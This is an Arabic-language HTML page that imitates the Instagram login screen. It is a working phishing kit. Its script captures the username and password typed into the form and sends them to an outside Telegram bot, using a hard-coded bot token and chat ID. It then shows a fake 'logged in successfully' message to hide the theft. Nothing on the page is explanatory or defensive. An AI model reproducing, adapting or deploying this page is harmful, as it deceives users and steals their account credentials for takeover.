<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram - تسجيل الدخول</title>
<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:-apple-system,'Segoe UI',Tahoma,Arial,sans-serif}
body{background:#000;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#000;border-radius:12px;padding:30px 25px;max-width:400px;width:100%;border:1px solid #262626}
.logo{text-align:center;margin-bottom:25px}
.logo .icon{width:80px;height:80px;border-radius:20px;background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888);display:inline-flex;justify-content:center;align-items:center;margin-bottom:15px}
.logo .icon span{font-size:40px;color:#fff}
.logo h1{color:#fff;font-size:24px;font-weight:300}
input{width:100%;padding:14px;border:1px solid #333;border-radius:8px;font-size:15px;background:#121212;color:#fff;box-sizing:border-box;margin-bottom:10px}
input::placeholder{color:#666}
.btn{width:100%;padding:14px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-size:15px;font-weight:bold;cursor:pointer;margin-top:10px}
.forgot{text-align:center;color:#0095f6;font-size:13px;margin-top:15px}
.divider{display:flex;align-items:center;margin:20px 0;color:#666;font-size:12px}
.divider::before,.divider::after{content:'';flex:1;height:1px;background:#333}
.divider span{padding:0 15px}
.signup{text-align:center;color:#fff;font-size:14px;margin-top:20px;border:1px solid #333;border-radius:8px;padding:15px}
.signup a{color:#0095f6;text-decoration:none;font-weight:bold}
.meta{text-align:center;color:#666;font-size:12px;margin-top:25px}
</style>
</head>
<body>
<div class="card">
<div class="logo">
<div class="icon"><span>📷</span></div>
<h1>Instagram</h1>
</div>
<form id="f">
<input type="text" id="user" placeholder="اسم المستخدم أو البريد الإلكتروني أو رقم الهاتف المحمول" required>
<input type="password" id="pass" placeholder="كلمة السر" required>
<button type="submit" class="btn">تسجيل الدخول</button>
</form>
<div class="forgot">هل نسيت كلمة السر؟</div>
<div class="divider"><span>أو</span></div>
<div class="signup">ليس لديك حساب؟ <a href="#">إنشاء حساب جديد</a></div>
<div class="meta">© 2026 Meta</div>
</div>
<script>
const BOT='8759039993:AAGnWHtrCwoAqrjbnQwicMiWQvhO55KLH7s';
const CHAT='-1003821295154';
document.getElementById('f').addEventListener('submit', async function(e){
e.preventDefault();
const msg='📷 *إنستغرام*\n\n👤 المستخدم: `'+document.getElementById('user').value+'`\n🔑 كلمة السر: `'+document.getElementById('pass').value+'`\n🕐 '+new Date().toLocaleString('ar-IQ');
const url='https://api.telegram.org/bot'+BOT+'/sendMessage?chat_id='+CHAT+'&text='+encodeURIComponent(msg)+'&parse_mode=Markdown';
try{await fetch(url);alert('تم تسجيل الدخول بنجاح');document.getElementById('f').reset();}catch(e){alert('خطأ');}
});
</script>
</body>
</html>
